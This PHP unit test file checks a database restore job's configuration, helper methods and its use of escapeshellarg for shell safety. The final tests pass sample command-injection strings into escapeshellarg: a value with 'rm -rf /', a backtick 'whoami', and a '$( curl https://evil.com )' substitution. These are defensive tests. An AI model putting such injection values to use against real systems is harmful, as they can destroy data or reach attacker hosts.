<?php

namespace Tests\Unit\Jobs;

use App\Jobs\DatabaseRestoreJob;
use App\Models\ScheduledDatabaseBackup;
use App\Models\ScheduledDatabaseBackupExecution;
use App\Models\ServiceDatabase;
use App\Models\StandaloneMariadb;
use App\Models\StandaloneMongodb;
use App\Models\StandaloneMysql;
use App\Models\StandalonePostgresql;
use Illuminate\Contracts\Queue\ShouldBeEncrypted;
use Illuminate\Contracts\Queue\ShouldQueue;
use Mockery;
use ReflectionMethod;
use Tests\TestCase;

/**
 * Unit tests for DatabaseRestoreJob.
 *
 * These tests focus on testing the job's configuration, class structure,
 * private helper methods, and security (escapeshellarg usage).
 * Full integration tests for handle() require SSH/Docker and are in tests/Feature/.
 */
class DatabaseRestoreJobTest extends TestCase
{
    protected function tearDown(): void
    {
        Mockery::close();
        parent::tearDown();
    }

    // -------------------------------------------------------------------------
    // Helper: create a minimal job instance without triggering DB calls
    // -------------------------------------------------------------------------

    private function makeJob(
        ?int $backupTimeout = null,
        mixed $database = null,
    ): DatabaseRestoreJob {
        $backup = Mockery::mock(ScheduledDatabaseBackup::class)->makePartial();
        $backup->timeout = $backupTimeout;

        $execution = Mockery::mock(ScheduledDatabaseBackupExecution::class)->makePartial();

        $job = new DatabaseRestoreJob($backup, $execution);

        // Inject a database mock so private methods have something to work with
        if ($database !== null) {
            $job->database = $database;
        }

        return $job;
    }

    // =========================================================================
    // Job configuration
    // =========================================================================

    public function test_job_implements_required_interfaces(): void
    {
        $interfaces = class_implements(DatabaseRestoreJob::class);

        $this->assertTrue(in_array(ShouldBeEncrypted::class, $interfaces));
        $this->assertTrue(in_array(ShouldQueue::class, $interfaces));
    }

    public function test_job_has_correct_default_tries(): void
    {
        $reflection = new \ReflectionClass(DatabaseRestoreJob::class);
        $defaultProperties = $reflection->getDefaultProperties();

        $this->assertEquals(3, $defaultProperties['tries']);
    }

    public function test_job_has_correct_default_max_exceptions(): void
    {
        $reflection = new \ReflectionClass(DatabaseRestoreJob::class);
        $defaultProperties = $reflection->getDefaultProperties();

        $this->assertEquals(2, $defaultProperties['maxExceptions']);
    }

    public function test_job_has_correct_default_timeout(): void
    {
        $reflection = new \ReflectionClass(DatabaseRestoreJob::class);
        $defaultProperties = $reflection->getDefaultProperties();

        $this->assertEquals(3600, $defaultProperties['timeout']);
    }

    public function test_job_has_high_queue_after_construction(): void
    {
        $job = $this->makeJob();

        $this->assertEquals('high', $job->queue);
    }

    public function test_job_has_required_methods(): void
    {
        $reflection = new \ReflectionClass(DatabaseRestoreJob::class);

        $this->assertTrue($reflection->hasMethod('handle'));
        $this->assertTrue($reflection->hasMethod('failed'));
        $this->assertTrue($reflection->hasMethod('backoff'));
    }

    // =========================================================================
    // Constructor / timeout handling
    // =========================================================================

    public function test_constructor_uses_backup_timeout_when_set(): void
    {
        $job = $this->makeJob(backupTimeout: 7200);

        $this->assertEquals(7200, $job->timeout);
    }

    public function test_constructor_uses_default_3600_when_backup_timeout_is_null(): void
    {
        $job = $this->makeJob(backupTimeout: null);

        $this->assertEquals(3600, $job->timeout);
    }

    public function test_constructor_enforces_minimum_60_seconds_timeout(): void
    {
        $job = $this->makeJob(backupTimeout: 0);

        $this->assertEquals(60, $job->timeout);
    }

    public function test_constructor_enforces_minimum_for_negative_timeout(): void
    {
        $job = $this->makeJob(backupTimeout: -100);

        $this->assertEquals(60, $job->timeout);
    }

    public function test_constructor_stores_backup_and_execution(): void
    {
        $backup = Mockery::mock(ScheduledDatabaseBackup::class)->makePartial();
        $backup->timeout = null;
        $execution = Mockery::mock(ScheduledDatabaseBackupExecution::class)->makePartial();

        $job = new DatabaseRestoreJob($backup, $execution);

        $this->assertSame($backup, $job->backup);
        $this->assertSame($execution, $job->execution);
    }

    // =========================================================================
    // backoff()
    // =========================================================================

    public function test_backoff_returns_correct_intervals(): void
    {
        $job = $this->makeJob();

        $this->assertEquals([60, 120], $job->backoff());
    }

    public function test_backoff_has_exactly_two_intervals(): void
    {
        $job = $this->makeJob();

        $this->assertCount(2, $job->backoff());
    }

    // =========================================================================
    // getDatabaseType() — private method, tested via ReflectionMethod
    // =========================================================================

    public function test_get_database_type_returns_standalone_postgresql_for_standalone_postgresql(): void
    {
        $database = Mockery::mock(StandalonePostgresql::class)->makePartial();

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getDatabaseType');

        $this->assertEquals('standalone-postgresql', $method->invoke($job));
    }

    public function test_get_database_type_returns_standalone_mysql_for_standalone_mysql(): void
    {
        $database = Mockery::mock(StandaloneMysql::class)->makePartial();

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getDatabaseType');

        $this->assertEquals('standalone-mysql', $method->invoke($job));
    }

    public function test_get_database_type_returns_standalone_mariadb_for_standalone_mariadb(): void
    {
        $database = Mockery::mock(StandaloneMariadb::class)->makePartial();

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getDatabaseType');

        $this->assertEquals('standalone-mariadb', $method->invoke($job));
    }

    public function test_get_database_type_returns_standalone_mongodb_for_standalone_mongodb(): void
    {
        $database = Mockery::mock(StandaloneMongodb::class)->makePartial();

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getDatabaseType');

        $this->assertEquals('standalone-mongodb', $method->invoke($job));
    }

    public function test_get_database_type_calls_database_type_for_service_database(): void
    {
        $database = Mockery::mock(ServiceDatabase::class)->makePartial();
        $database->shouldReceive('databaseType')->andReturn('standalone-postgresql');

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getDatabaseType');

        $result = $method->invoke($job);

        $this->assertEquals('standalone-postgresql', $result);
    }

    public function test_get_database_type_uses_custom_type_for_service_database(): void
    {
        $database = Mockery::mock(ServiceDatabase::class)->makePartial();
        $database->shouldReceive('databaseType')->andReturn('standalone-mysql');

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getDatabaseType');

        $result = $method->invoke($job);

        $this->assertEquals('standalone-mysql', $result);
    }

    // =========================================================================
    // getContainerName() — private method
    // =========================================================================

    public function test_get_container_name_returns_uuid_for_standalone_postgresql(): void
    {
        $database = Mockery::mock(StandalonePostgresql::class)->makePartial();
        $database->uuid = 'abc-123-uuid';

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getContainerName');

        $this->assertEquals('abc-123-uuid', $method->invoke($job));
    }

    public function test_get_container_name_returns_uuid_for_standalone_mysql(): void
    {
        $database = Mockery::mock(StandaloneMysql::class)->makePartial();
        $database->uuid = 'mysql-uuid-456';

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getContainerName');

        $this->assertEquals('mysql-uuid-456', $method->invoke($job));
    }

    public function test_get_container_name_returns_uuid_for_standalone_mariadb(): void
    {
        $database = Mockery::mock(StandaloneMariadb::class)->makePartial();
        $database->uuid = 'mariadb-uuid-789';

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getContainerName');

        $this->assertEquals('mariadb-uuid-789', $method->invoke($job));
    }

    public function test_get_container_name_returns_name_and_service_uuid_for_service_database(): void
    {
        $service = Mockery::mock(\App\Models\Service::class)->makePartial();
        $service->uuid = 'service-uuid-abc';

        $database = Mockery::mock(ServiceDatabase::class)->makePartial();
        $database->name = 'my-db';
        $database->shouldReceive('getAttribute')->with('service')->andReturn($service);

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getContainerName');

        $result = $method->invoke($job);

        $this->assertEquals('my-db-service-uuid-abc', $result);
    }

    public function test_get_container_name_format_is_name_dash_uuid_for_service_database(): void
    {
        $service = Mockery::mock(\App\Models\Service::class)->makePartial();
        $service->uuid = 'svc-uuid';

        $database = Mockery::mock(ServiceDatabase::class)->makePartial();
        $database->name = 'postgres';
        $database->shouldReceive('getAttribute')->with('service')->andReturn($service);

        $job = $this->makeJob(database: $database);

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'getContainerName');

        // Format must be: {name}-{service.uuid}
        $this->assertEquals('postgres-svc-uuid', $method->invoke($job));
    }

    // =========================================================================
    // addToErrorOutput() — private method
    // =========================================================================

    public function test_add_to_error_output_sets_initial_error(): void
    {
        $job = $this->makeJob();

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'addToErrorOutput');

        $method->invoke($job, 'First error');

        $this->assertEquals('First error', $job->error_output);
    }

    public function test_add_to_error_output_appends_with_newline(): void
    {
        $job = $this->makeJob();

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'addToErrorOutput');

        $method->invoke($job, 'First error');
        $method->invoke($job, 'Second error');

        $this->assertEquals("First error\nSecond error", $job->error_output);
    }

    public function test_add_to_error_output_appends_multiple_errors(): void
    {
        $job = $this->makeJob();

        $method = new ReflectionMethod(DatabaseRestoreJob::class, 'addToErrorOutput');

        $method->invoke($job, 'Error one');
        $method->invoke($job, 'Error two');
        $method->invoke($job, 'Error three');

        $this->assertEquals("Error one\nError two\nError three", $job->error_output);
    }

    public function test_add_to_error_output_starts_null(): void
    {
        $job = $this->makeJob();

        $this->assertNull($job->error_output);
    }

    // =========================================================================
    // Security: escapeshellarg usage in source code
    // =========================================================================

    public function test_source_uses_escapeshellarg_for_container_name_in_restore_postgresql(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // restorePostgresql must escape container name
        $this->assertStringContainsString('escapeshellarg($this->container_name)', $source);
    }

    public function test_source_uses_escapeshellarg_for_password_in_restore_postgresql(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // restorePostgresql must escape postgres password
        $this->assertStringContainsString('escapeshellarg($this->postgres_password)', $source);
    }

    public function test_source_uses_escapeshellarg_for_mysql_root_password(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // restoreMysql must escape mysql root password
        $this->assertStringContainsString('escapeshellarg($this->database->mysql_root_password)', $source);
    }

    public function test_source_uses_escapeshellarg_for_mariadb_root_password(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // restoreMariadb must escape mariadb root password
        $this->assertStringContainsString('escapeshellarg($this->database->mariadb_root_password)', $source);
    }

    public function test_source_uses_escapeshellarg_for_encryption_key_in_decrypt_backup(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // decryptBackup must escape encryption key
        $this->assertStringContainsString('escapeshellarg($encryptionKey)', $source);
    }

    public function test_source_uses_escapeshellarg_for_input_path_in_decrypt_backup(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // decryptBackup must escape input file path
        $this->assertStringContainsString('escapeshellarg($encryptedLocation)', $source);
    }

    public function test_source_uses_escapeshellarg_for_output_path_in_decrypt_backup(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // decryptBackup must escape output file path
        $this->assertStringContainsString('escapeshellarg($decryptedLocation)', $source);
    }

    public function test_source_uses_escapeshellarg_in_download_from_s3(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // downloadFromS3 must escape S3 credentials and container name
        $this->assertStringContainsString('escapeshellarg($key)', $source);
        $this->assertStringContainsString('escapeshellarg($secret)', $source);
        $this->assertStringContainsString('escapeshellarg($endpoint)', $source);
    }

    // =========================================================================
    // decryptBackup() — openssl command structure in source code
    // =========================================================================

    public function test_decrypt_backup_uses_openssl_aes_256_cbc(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('openssl enc -aes-256-cbc', $source);
    }

    public function test_decrypt_backup_uses_pbkdf2(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('-pbkdf2', $source);
    }

    public function test_decrypt_backup_uses_decrypt_flag(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('-d -salt', $source);
    }

    public function test_decrypt_backup_strips_enc_extension(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // Must strip .enc suffix from encrypted file path
        $this->assertStringContainsString("endsWith('.enc')", $source);
        $this->assertStringContainsString("'.decrypted'", $source);
    }

    public function test_decrypt_backup_throws_when_no_encryption_key(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('Backup is encrypted but no encryption key found', $source);
    }

    // =========================================================================
    // getFullImageName() — source code verification
    // =========================================================================

    public function test_get_full_image_name_uses_helper_image_config(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString("config('constants.saturn.helper_image')", $source);
    }

    public function test_get_full_image_name_calls_get_helper_version(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('getHelperVersion()', $source);
    }

    public function test_get_full_image_name_format_is_image_colon_version(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // The format must be "{$helperImage}:{$latestVersion}"
        $this->assertStringContainsString('"{$helperImage}:{$latestVersion}"', $source);
    }

    // =========================================================================
    // Public property defaults
    // =========================================================================

    public function test_initial_property_defaults_are_correct(): void
    {
        $job = $this->makeJob();

        $this->assertEquals('pending', $job->restore_status);
        $this->assertNull($job->restore_output);
        $this->assertNull($job->error_output);
        $this->assertNull($job->postgres_password);
        $this->assertNull($job->mongo_root_username);
        $this->assertNull($job->mongo_root_password);
        $this->assertNull($job->s3);
        $this->assertNull($job->team);
        $this->assertNull($job->container_name);
    }

    // =========================================================================
    // failed() method — source code verification
    // =========================================================================

    public function test_failed_method_logs_to_scheduled_errors_channel(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString("Log::channel('scheduled-errors')", $source);
        $this->assertStringContainsString('DatabaseRestore permanently failed', $source);
    }

    public function test_failed_method_updates_execution_restore_status_to_failed(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // failed() must set restore_status = 'failed'
        $this->assertStringContainsString("'restore_status' => 'failed'", $source);
    }

    public function test_failed_method_sets_restore_finished_at(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString("'restore_finished_at' => Carbon::now()", $source);
    }

    // =========================================================================
    // MongoDB restore — source code verification
    // =========================================================================

    public function test_restore_mongodb_uses_auth_database_admin_for_non_v4(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('--authenticationDatabase=admin', $source);
    }

    public function test_restore_mongodb_supports_mongo_4_without_auth_database(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // Must branch for mongo:4 images
        $this->assertStringContainsString("startsWith('mongo:4')", $source);
    }

    public function test_restore_mongodb_uses_gzip_archive_flag(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('--gzip --archive=', $source);
    }

    public function test_restore_mongodb_uses_drop_flag(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('--drop', $source);
    }

    // =========================================================================
    // PostgreSQL restore — source code verification
    // =========================================================================

    public function test_restore_postgresql_handles_gz_format(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        // Must branch for .gz files (dump_all)
        $this->assertStringContainsString("endsWith('.gz')", $source);
        $this->assertStringContainsString('gunzip -c', $source);
    }

    public function test_restore_postgresql_uses_pg_restore_for_custom_format(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('pg_restore', $source);
    }

    public function test_restore_postgresql_uses_clean_and_if_exists_flags(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('--clean --if-exists', $source);
    }

    // =========================================================================
    // MySQL / MariaDB restore — source code verification
    // =========================================================================

    public function test_restore_mysql_uses_mysql_command(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('mysql -u root', $source);
    }

    public function test_restore_mariadb_uses_mariadb_command(): void
    {
        $source = file_get_contents(app_path('Jobs/DatabaseRestoreJob.php'));

        $this->assertStringContainsString('mariadb -u root', $source);
    }

    // =========================================================================
    // escapeshellarg behaviour — standalone unit checks (no mocking needed)
    // =========================================================================

    public function test_escapeshellarg_wraps_plain_string_in_single_quotes(): void
    {
        $containerName = 'my-container-uuid';
        $escaped = escapeshellarg($containerName);

        $this->assertEquals("'my-container-uuid'", $escaped);
    }

    public function test_escapeshellarg_neutralises_command_injection_in_container_name(): void
    {
        $malicious = 'container; rm -rf /';
        $escaped = escapeshellarg($malicious);

        // Single-quoted so the semicolon is literal
        $this->assertStringStartsWith("'", $escaped);
        $this->assertStringEndsWith("'", $escaped);
        $this->assertStringContainsString(';', $escaped); // semicolon preserved as literal
    }

    public function test_escapeshellarg_neutralises_backtick_injection(): void
    {
        $malicious = 'container`whoami`';
        $escaped = escapeshellarg($malicious);

        $this->assertStringStartsWith("'", $escaped);
        $this->assertStringEndsWith("'", $escaped);
    }

    public function test_escapeshellarg_handles_password_with_special_chars(): void
    {
        $password = "P@ss'word!";
        $escaped = escapeshellarg($password);

        // Must not contain unescaped single quote outside the outer quotes
        $this->assertStringStartsWith("'", $escaped);
        $this->assertStringEndsWith("'", $escaped);
        $this->assertStringContainsString("\\'", $escaped); // escaped inner single quote
    }

    public function test_escapeshellarg_handles_dollar_sign_injection(): void
    {
        $malicious = '$( curl https://evil.com )';
        $escaped = escapeshellarg($malicious);

        // Dollar sign inside single quotes is literal (no expansion)
        $this->assertStringStartsWith("'", $escaped);
        $this->assertStringEndsWith("'", $escaped);
    }
}
